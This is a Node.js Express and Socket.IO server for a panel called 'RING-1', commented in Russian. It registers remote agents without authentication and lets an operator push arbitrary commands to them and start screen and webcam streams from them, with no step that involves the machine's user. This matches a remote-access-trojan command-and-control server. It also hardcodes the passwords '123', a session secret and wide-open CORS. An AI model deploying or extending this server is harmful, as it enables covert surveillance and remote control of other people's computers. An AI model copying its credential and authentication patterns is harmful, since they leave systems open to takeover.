const express = require('express');
const session = require('express-session');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: '*', methods: ['GET', 'POST'] } });

const PORT = process.env.PORT || 3000;

const users = [
    { id: 1, username: 'admin', password: '123' },
    { id: 2, username: 'user', password: '123' }
];

const computers = new Map(); // computerId -> { info, socketId }
const sessions = new Map(); // sessionId -> { computerId, type }

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
    secret: 'ring1-secret',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 3600000 }
}));

function requireAuth(req, res, next) {
    if (req.session.user) next();
    else res.status(401).json({ error: 'Unauthorized' });
}

// REST API
app.post('/api/agent/register', (req, res) => {
    const { computerId, computerName, os, hostname, ip } = req.body;
    computers.set(computerId, {
        computerId, computerName: computerName || hostname, os, hostname, ip,
        lastSeen: new Date().toISOString(), status: 'online', socketId: null
    });
    res.json({ success: true });
});

app.post('/api/agent/heartbeat', (req, res) => {
    const { computerId } = req.body;
    if (computers.has(computerId)) {
        const comp = computers.get(computerId);
        comp.lastSeen = new Date().toISOString();
        computers.set(computerId, comp);
    }
    res.json({ success: true });
});

app.get('/api/computers', requireAuth, (req, res) => {
    res.json(Array.from(computers.values()));
});

app.delete('/api/computers/:id', requireAuth, (req, res) => {
    computers.delete(req.params.id);
    res.json({ success: true });
});

// Команды агенту через Socket.IO
app.post('/api/command/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const { command } = req.body;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        io.to(computer.socketId).emit('command', { command });
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// Запрос на стрим экрана
app.post('/api/stream/screen/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const sessionId = `screen_${Date.now()}_${Math.random()}`;
        sessions.set(sessionId, { computerId: id, type: 'screen' });
        io.to(computer.socketId).emit('start_screen_stream', { sessionId });
        res.json({ sessionId });
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// Запрос на стрим вебкамеры
app.post('/api/stream/webcam/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const computer = computers.get(id);
    
    if (computer && computer.socketId) {
        const sessionId = `webcam_${Date.now()}_${Math.random()}`;
        sessions.set(sessionId, { computerId: id, type: 'webcam' });
        io.to(computer.socketId).emit('start_webcam_stream', { sessionId });
        res.json({ sessionId });
    } else {
        res.status(404).json({ error: 'Computer offline' });
    }
});

// Остановка стрима
app.post('/api/stream/stop/:sessionId', requireAuth, (req, res) => {
    const session = sessions.get(req.params.sessionId);
    if (session) {
        const computer = computers.get(session.computerId);
        if (computer && computer.socketId) {
            io.to(computer.socketId).emit('stop_stream');
        }
        sessions.delete(req.params.sessionId);
    }
    res.json({ success: true });
});

// Логин/логаут
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = users.find(u => u.username === username && u.password === password);
    if (!user) return res.status(401).json({ error: 'Invalid' });
    req.session.user = { id: user.id, username: user.username };
    res.json({ success: true });
});

app.get('/api/user', requireAuth, (req, res) => {
    res.json(req.session.user);
});

app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Socket.IO для WebRTC сигналинга и видео
io.on('connection', (socket) => {
    console.log(`🔌 Socket connected: ${socket.id}`);
    
    // Агент регистрирует свой socket
    socket.on('agent_register', (data) => {
        const { computerId } = data;
        if (computers.has(computerId)) {
            const comp = computers.get(computerId);
            comp.socketId = socket.id;
            computers.set(computerId, comp);
            console.log(`🤖 Agent ${computerId} registered with socket ${socket.id}`);
        }
    });
    
    // WebRTC сигналинг от агента к панели
    socket.on('webrtc_signal', (data) => {
        const { targetSessionId, signal } = data;
        io.to(`panel_${targetSessionId}`).emit('webrtc_signal', { signal, from: 'agent' });
    });
    
    // WebRTC сигналинг от панели к агенту
    socket.on('panel_signal', (data) => {
        const { computerId, signal } = data;
        const computer = computers.get(computerId);
        if (computer && computer.socketId) {
            io.to(computer.socketId).emit('webrtc_signal', { signal, from: 'panel' });
        }
    });
    
    // Панель подключается к просмотру
    socket.on('join_stream', (sessionId) => {
        socket.join(`panel_${sessionId}`);
        console.log(`👁️ Panel joined stream: ${sessionId}`);
    });
    
    socket.on('disconnect', () => {
        console.log(`🔌 Socket disconnected: ${socket.id}`);
        // Очищаем socketId у агента
        for (let [id, comp] of computers) {
            if (comp.socketId === socket.id) {
                comp.socketId = null;
                comp.status = 'offline';
                computers.set(id, comp);
                break;
            }
        }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ RING-1 сервер запущен на порту ${PORT}`);
});